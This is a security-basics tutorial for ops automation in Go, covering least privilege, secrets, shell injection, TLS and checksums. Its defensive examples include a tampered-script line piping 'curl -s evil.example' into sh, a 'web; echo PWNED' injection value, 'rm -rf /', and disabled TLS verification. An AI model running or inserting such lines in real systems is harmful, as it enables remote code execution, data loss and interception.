# Security basics for automation

**In one sentence:** security is making sure only the right people and programs can read, change or stop your systems, and automation needs extra care because it holds powerful credentials and does exactly what it's told, very fast.

**Why it matters:** a deploy script with an admin AWS key, a CI token that can push to every repo, or a chat bot that builds shell commands from user text is often the easiest way in; many cloud incidents start with a leaked key or a too-broad permission, not clever hacking.

**You'll learn:**

- The three things security protects (confidentiality, integrity, availability).
- Authentication versus authorization, and least privilege in AWS IAM and Kubernetes RBAC.
- How to handle secrets: where they live, how they leak, how to rotate them.
- How injection works, and why `exec.Command` with separate arguments prevents it.
- What TLS verification, hashing, checksums and pinned dependencies protect against.
- Safe defaults, failing closed, and audit logs.

## What you're protecting

Security people sum up the goals in three words, the *CIA triad*:

| Goal | Means | Ops example of losing it |
|---|---|---|
| Confidentiality | Only the right people can read it | Database password printed in a CI log |
| Integrity | Nobody can change it unnoticed | Attacker swaps the binary your deploy downloads |
| Availability | It works when needed | A script deletes every EC2 instance in a region |

Every rule in this guide protects one or more of these. They can pull against each other: locking everything down helps confidentiality but hurts availability if nobody can fix an outage. Choose the trade-off on purpose.

## Who are you, and what may you do?

Two questions, always in this order:

- *Authentication* (authn): **who are you?** Proved with a password, access key, certificate or token.
- *Authorization* (authz): **what may you do?** Is that identity allowed this action on this thing?

HTTP keeps them apart too: `401 Unauthorized` really means "I don't know who you are"; `403 Forbidden` means "I know who you are, and no".

| | AWS | Kubernetes |
|---|---|---|
| Identity | IAM user or role | User, group or ServiceAccount |
| Proves it with | Signed requests (access key or role credentials) | Client cert, token |
| Permissions | IAM policies | Role or ClusterRole |
| Attached by | Policy on the user or role | RoleBinding or ClusterRoleBinding |

In both, the default answer is **no**. AWS denies anything no policy allows, and an explicit `Deny` beats any `Allow`. Kubernetes RBAC only adds permissions; with no binding, a ServiceAccount can do nothing.

To check before you act: `kubectl auth can-i delete pods -n prod`, or an EC2 `DryRun` call, which you'll use in *AWS API errors: EC2 dry-run permission checks*.

## Least privilege

*Least privilege* means giving each person or program only the permissions its job needs, and nothing more.

Here's a policy that shows up in real accounts, attached to a nightly backup script "just to get it working":

```text
{
  "Effect": "Allow",
  "Action": "*",
  "Resource": "*"
}
```

That says: this script may do anything, to anything. If its key leaks, the attacker can read every bucket, delete every database and create new admin users. The script only needed this:

```text
{
  "Effect": "Allow",
  "Action": ["s3:PutObject"],
  "Resource": "arn:aws:s3:::acme-db-backups/nightly/*"
}
```

Same script, same job. If this key leaks, the attacker can write files into one backup folder. The damage a leak can do is called the *blast radius*, and least privilege is how you shrink it.

**A CI token with too much reach.** A team's pipeline uses one admin's personal access token: write access to every repo, plus the production deploy role. One day a compromised test dependency reads the job's environment and sends the token home. The attacker can now push code to any repo and deploy it. Least privilege for CI means:

- **One identity per job**, scoped to one repo and one purpose, read-only unless the job must write.
- **Short-lived credentials** instead of stored tokens (see below).
- **No secrets for untrusted code**, such as jobs triggered by pull requests from forks.
- **Pull, don't push**, where possible: a GitOps agent inside the cluster pulls from git, so CI needs no cluster credentials at all (see the *Declarative systems and control loops* guide).

One more habit: **remove what isn't used.** IAM shows when a role last used each service; unused permissions are pure risk.

## Secrets

A *secret* is any value that grants access: passwords, API tokens, AWS access keys, TLS private keys, webhook URLs with a token in them.

### A leaked key, start to finish

A developer tests a script with an access key pasted into `config.go` and pushes it to a public GitHub repo. Bots scan public pushes for anything shaped like an AWS key; such keys are commonly found and abused within minutes, often to run crypto-mining instances on your bill or copy your S3 data.

Deleting the file in a new commit doesn't help: the key is still in git history, and it was copied the moment it was pushed. The fix, in order:

1. **Deactivate the key** in IAM, right now.
2. **Find out what it did**, from CloudTrail (see the audit section below).
3. Replace it, and remove it from history so it doesn't leak again.

### Where secrets should live

- **Never in code or git.** History is forever, and repos get shared.
- **Environment variables** are acceptable, with care. They keep secrets out of git, but leak quietly: child processes inherit them, crash reports may dump them, and a CI step that runs `env` prints them all.
- **A secret manager is best.** AWS Secrets Manager, SSM Parameter Store and HashiCorp Vault store secrets encrypted, let IAM decide who may read each one, log every read and support rotation.

Kubernetes Secrets are only base64-encoded by default, not encrypted. Anyone allowed to `get secrets` in a namespace can read them.

### Better than storing a secret: not having one

Prefer *short-lived credentials* that expire on their own, so there's no long-lived key to leak:

- An EC2 instance or EKS pod with an IAM role gets temporary credentials from AWS automatically. The SDK's default credential chain finds them, as in *AWS SDK configuration: many regions, no leaked keys*.
- CI systems like GitHub Actions can swap a signed identity token (OIDC) for a short-lived AWS role session, so no AWS key is stored in CI at all.

### Rotation

*Rotation* means replacing a secret regularly, and at once after a suspected leak. If rotating means redeploying ten services by hand, nobody will do it, so design for it: read secrets at startup or on reload, not baked into images.

### Keeping secrets out of logs

A secret in a log is a leaked secret: logs get shipped, indexed and read by many people. In Go you can give secrets a type that refuses to print itself, with a `String` method as in *Stringers*:

```go
package main

import "fmt"

// Secret holds a sensitive value but never prints it.
type Secret string

func (s Secret) String() string { return "[REDACTED]" }

type DBConfig struct {
	Host     string
	User     string
	Password Secret
}

func main() {
	cfg := DBConfig{Host: "db.internal", User: "app", Password: "hunter2"}
	fmt.Println("connecting with", cfg)
	fmt.Printf("password is %v\n", cfg.Password)
	fmt.Println("length is", len(cfg.Password)) // code can still use it
}
```

It prints:

```text
connecting with {db.internal app [REDACTED]}
password is [REDACTED]
length is 7
```

`fmt` calls `String` for `%v` and `Println`, even inside a struct, so the password never appears. Your code can still use the real value, as `len` does.

It's a safety net, not a guarantee: `%#v` and `encoding/json` don't call `String`, so they would print `hunter2`. CI systems also mask known secrets in logs, but only exact matches; a base64-encoded copy slips through.

## Injection: when data becomes code

In *Variables: build ops commands* you built command strings by gluing pieces together. That's fine for printing. It's dangerous when the result is *run*, and part of it came from someone else.

A chat bot restarts services: a user types `restart web`, and the bot runs a shell command with the name glued in. Now a user types `restart web; echo PWNED`:

```go
package main

import (
	"fmt"
	"os/exec"
)

func run(label string, cmd *exec.Cmd) {
	out, err := cmd.Output()
	if err != nil {
		fmt.Println(label, "failed:", err)
		return
	}
	fmt.Printf("%s %q\n", label, out)
}

func main() {
	service := "web; echo PWNED" // imagine this came from a chat command

	// Unsafe: one string handed to a shell. The shell sees ";" and
	// runs a second command.
	run("unsafe:", exec.Command("sh", "-c", "echo restarting "+service))

	// Safe: no shell. echo gets the whole value as one argument.
	run("safe:  ", exec.Command("echo", "restarting", service))
}
```

It prints:

```text
unsafe: "restarting web\nPWNED\n"
safe:   "restarting web; echo PWNED\n"
```

Step by step:

1. **Unsafe.** The bot builds `echo restarting web; echo PWNED` and gives it to `sh`. To a shell, `;` means "start another command", so it runs both. An attacker would type `rm -rf /` instead.
2. **Safe.** `exec.Command("echo", "restarting", service)` starts `echo` directly, with no shell. Each Go string is one argument, so the `;` is just a character inside the third one.

This is *injection*: untrusted data ends up interpreted as code. The same bug appears as SQL injection (queries built with `+`) and path traversal (a filename like `../../etc/passwd`; see *Checksums and archives: verify and extract safely*).

The defences:

- **Keep data and code apart.** Separate arguments to `exec.Command`, placeholders in SQL, never `sh -c` with outside input. More in *Running commands: output, exit codes and timeouts*.
- **Validate against an allowlist.** A service name should match something like `^[a-z0-9-]{1,63}$`. Reject anything else instead of stripping "bad" characters.
- **Treat everything from outside as untrusted**: chat messages, HTTP requests, webhooks, file names.

## TLS: is this really the server?

*TLS* (the S in HTTPS) gives a connection confidentiality, integrity, and proof you're talking to the real server. The *Networking from the ground up* guide covers how it works.

That proof comes from the server's *certificate*: a document saying "this key belongs to `vault.internal`", signed by a *certificate authority* (CA) your machine trusts. Go's HTTP client checks the signature chain and that the name matches the host you asked for.

When an internal server uses a certificate from your company's own CA, Go doesn't trust it and the request fails. The tempting "fix" you'll find online:

```text
tls.Config{InsecureSkipVerify: true}   // never in production
```

That turns off the "real server" check completely. The connection is still encrypted, but to *anyone*: an attacker on the network path can present their own certificate, read your Vault token and pass the traffic on. That's a *man-in-the-middle* attack.

The real fix is to load your company's CA certificate into the client's trusted roots. You'll do that in *TLS: trust a CA and read certificates* and remove a skip in *TLS: stop skipping verification*.

## Hashing, encryption and checksums

Three ideas that get mixed up, plus one that isn't security at all:

| Technique | Reversible? | Needs a key? | Used for |
|---|---|---|---|
| Encoding (base64, hex) | Yes, by anyone | No | Fitting bytes into text. Not security |
| Hashing (SHA-256) | No | No | Fingerprints, checksums |
| Encryption (AES, TLS) | Yes, with the key | Yes | Hiding data |
| Signing | No: it's checked, not read | Private key to sign | Proving who made it |

A *hash* turns any input into a short, fixed-size fingerprint. Change one input byte and the hash changes completely, and you can't get the input back.

A *checksum* is a hash used to check that a file is the one you expected. Many tools publish a SHA-256 next to each download:

```go
package main

import (
	"crypto/sha256"
	"fmt"
)

// The publisher lists this next to the download, on a page you trust.
const want = "430da46d8752e0b90743ebb82701517b" +
	"b4bc49793e93eb8aa3f6983e6a9cd2f3"

func verify(name string, data []byte) {
	got := fmt.Sprintf("%x", sha256.Sum256(data))
	if got != want {
		fmt.Printf("%s: checksum mismatch, refusing to install\n", name)
		return
	}
	fmt.Printf("%s: checksum ok, installing\n", name)
}

func main() {
	original := "#!/bin/sh\necho installing tool v1.4.2\n"
	tampered := original + "curl -s evil.example | sh\n"
	verify("original", []byte(original))
	verify("tampered", []byte(tampered))
}
```

It prints:

```text
original: checksum ok, installing
tampered: checksum mismatch, refusing to install
```

`sha256.Sum256` hashes the bytes, `%x` turns the result into hex text, and the program compares that with the published value. One extra line in the script gives a completely different hash, so the tampered copy is refused.

Two limits:

- A checksum only proves integrity if the expected value comes from somewhere the attacker can't also change. If they control the download server, they can change both. Signatures solve that.
- **Passwords need a slow hash** like bcrypt or argon2. SHA-256 is fast enough for attackers to try billions of guesses per second.

## The supply chain

Your program is mostly other people's code: Go modules, base images, CI actions, install scripts. Attacking any of those is a *supply chain attack*.

Go gives you good defaults:

- `go.mod` records which version of each dependency to use, so builds are repeatable and nothing upgrades behind your back.
- `go.sum` records a hash of each module's contents, and the `go` command refuses a download that doesn't match. New modules are also checked against a public checksum database, so everyone gets identical bytes.
- `govulncheck` reports known vulnerabilities in the code you actually call.

Elsewhere: **pin container images by digest** (`web@sha256:4f1a...`, since a tag like `latest` can be moved), **pin CI actions** to a commit hash, and **never `curl ... | sh`** in a pipeline without checking a checksum first.

## Safe defaults and failing closed

Code meets surprises: a config key is missing, the auth service times out. What it does next is a security decision.

- *Fail closed*: when unsure, deny or stop. Auth service unreachable? Reject the request.
- *Fail open*: when unsure, allow or carry on. Auth service unreachable? Let everyone in.

For anything guarding access or destroying things, fail closed. A cleanup script whose filter fails to load must delete nothing, not "everything matching an empty filter".

*Safe defaults* means doing nothing gets you the safe setting: a destructive tool runs as a dry run unless you pass `--apply`; a missing `ALLOWED_USERS` means nobody, not everybody; a new S3 bucket blocks public access.

Failing closed costs availability: if the auth service is down, so is your API. That's usually right for security checks, less so for a metrics exporter. Decide on purpose.

## Audit logs

When something goes wrong, the first question is "who did what, when?" An *audit log* answers it.

- **AWS CloudTrail** records API calls: which identity, what action (`DeleteBucket`), on what, when, from which IP, and whether it was allowed.
- **Kubernetes audit logs** record requests to the API server.
- **Your own tools** should do the same: "`alice` ran `restart web` in prod at 14:02: ok". You'll write one in *Files: an append-only audit log*.

Good audit logs are append-only, stored where the actor can't edit them, and never contain secrets. In the leaked-key story, CloudTrail is how you learn what the attacker touched.

## Common mistakes

- **"Fixing" a committed secret with another commit.** Rotate it; git history keeps the old one.
- **`"Action": "*"` to get something working.** Grant the exact actions on the exact resources.
- **One powerful shared CI token.** Each pipeline gets its own minimal, short-lived credentials.
- **Shell commands built with `+` or `Sprintf`.** Use `exec.Command` with separate arguments.
- **`InsecureSkipVerify: true`.** Trust the right CA instead.
- **Failing open by accident.** An error path that skips the auth check is an open door.

## Check yourself

1. A teammate pushed an AWS key to a public repo an hour ago and has just deleted it in a new commit. What should happen first, and why isn't the new commit enough?
2. Your CI pipeline only needs to upload build artifacts to one S3 prefix. Its IAM user has `AdministratorAccess`. What's the risk, and what would you change?
3. A Slack bot runs `exec.Command("sh", "-c", "kubectl rollout restart deploy/"+name)`. What can a user do, and how do you fix it?
4. Why doesn't `InsecureSkipVerify: true` just mean "encrypted but slightly less safe"?
5. You download a release and its SHA-256 from the same compromised server, and they match. Are you safe?
6. A cleanup job can't read its "protected buckets" list at startup. What should it do?

## Answers

1. Deactivate the key in IAM immediately, then check CloudTrail for what it was used for. The key is still in git history, and scanners may have copied it within minutes; only revoking it stops its use.
2. The blast radius is the whole account: a leaked CI credential could read or delete anything. Give the pipeline its own role allowing only `s3:PutObject` on that prefix, ideally assumed through OIDC so no long-lived key is stored at all.
3. A user can add `; any command` and the shell runs it with the bot's permissions: shell injection. Run `exec.Command("kubectl", "rollout", "restart", "deploy/"+name)` with no shell, and validate `name` against an allowlist pattern first.
4. Encryption only helps if you're talking to the right party. Without verification, an attacker in the middle can present their own certificate: the connection is encrypted, but to the attacker, who can read and change everything.
5. No. An attacker who controls the server can replace both the file and its checksum. The expected value must come from a separate trusted source, or the release must be signed.
6. Fail closed: stop with an error and delete nothing. Carrying on without the list could delete exactly the buckets it was meant to protect.

## Key terms

| Term | Meaning |
|---|---|
| CIA triad | Confidentiality, integrity and availability |
| Authentication | Proving who you are |
| Authorization | Deciding what an identity may do |
| Least privilege | Granting only the permissions a job needs |
| Blast radius | How much damage one compromised credential can do |
| Secret | Any value that grants access |
| Secret manager | A service that stores, controls and audits secrets |
| Short-lived credentials | Credentials that expire on their own |
| Rotation | Replacing a secret regularly or after a leak |
| Injection | Untrusted data being run as code |
| TLS | Encrypted, tamper-evident, authenticated connections |
| Certificate | A CA-signed statement binding a name to a key |
| Certificate authority | An issuer whose signatures clients trust |
| Man-in-the-middle | An attacker relaying and reading traffic between two parties |
| Hash | A one-way, fixed-size fingerprint of data |
| Checksum | A hash used to check a file is unchanged |
| Supply chain attack | Attacking you through code or tools you depend on |
| Fail closed | Denying or stopping when something is unknown |
| Fail open | Allowing or carrying on when something is unknown |
| Safe default | The setting you get without asking is the safe one |
| Audit log | A tamper-resistant record of who did what, when |

## Go deeper

- [Security best practices in IAM](https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html) (AWS): least privilege and temporary credentials, from the source.
- [Using RBAC Authorization](https://kubernetes.io/docs/reference/access-authn-authz/rbac/) (kubernetes.io): Roles, bindings and real examples.
- [Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html) (OWASP): storing, rotating and auditing secrets.
- [OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html) (OWASP): more injection examples and defences.
- [How Go Mitigates Supply Chain Attacks](https://go.dev/blog/supply-chain) (Go blog): what `go.sum` and the checksum database protect you from.
